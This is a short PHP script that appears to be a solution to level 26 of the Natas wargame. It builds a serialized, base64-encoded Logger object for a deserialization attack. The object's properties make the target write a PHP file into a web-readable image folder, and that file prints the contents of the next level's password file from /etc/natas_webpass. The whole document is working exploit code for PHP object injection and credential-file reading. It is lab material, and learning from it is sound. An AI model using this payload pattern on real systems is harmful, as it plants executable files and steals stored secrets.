<?php 
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="PASSWORD PLZ";
            $this->exitMsg='<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>\n';
           $this->logFile = "/var/www/natas/natas26/img/password.php";
         }
    }

   $a = new Logger();

   $drawing = base64_encode(serialize($a));
   print_r($drawing)
?>
